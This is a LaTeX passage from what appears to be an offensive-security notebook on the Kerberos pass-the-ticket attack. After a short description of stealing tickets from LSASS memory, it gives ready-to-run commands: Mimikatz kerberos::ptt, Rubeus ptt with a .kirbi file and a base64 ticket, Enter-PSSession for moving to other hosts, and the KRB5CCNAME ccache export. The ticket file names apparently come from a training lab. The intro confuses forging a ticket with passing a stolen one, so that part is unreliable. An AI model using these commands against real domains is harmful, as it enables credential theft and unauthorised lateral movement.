
\subsection{Pass the ticket}
\label{network:kerberos:ptt}
In  this attack, the threat actor creates a fake session key by forging a  fake
TGT. The attacker will present this to the service as a valid  credential.

In order to execute this attack, the attacker must obtain access to the
session key. To perform this attack, an attacker  would obtain Kerberos tickets
from the memory of the LSASS process, and  then inject the stolen TGT into
their own session, which will let them  adopt the identity and privileges of
the stolen TGT.

\subsubsection{On windows}

\begin{verbatim}
 kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# base64 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
\end{verbatim}


\subsubsection{Windows remoting}
after injecting ticket
\begin{verbatim}
Enter-PSSession -ComputerName <Name>
\end{verbatim}

\subsubsection{On linux}

Most attack tools support kerberos by default.
\subsection{Abusing ccache}

requiere read permission

\begin{verbatim}
$ export KRB5CCNAME=<ccache file>
\end{verbatim}




\url{https://www.hackingarticles.in/lateral-movement-pass-the-ticket-attack/}

\url{https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/}

\url{https://www.hackingarticles.in/lateral-movement-pass-the-ccache/}

\subsubsection{From Windows}

ticket are exported using either mimikatz or rubeus

\subsubsection{From Linux}
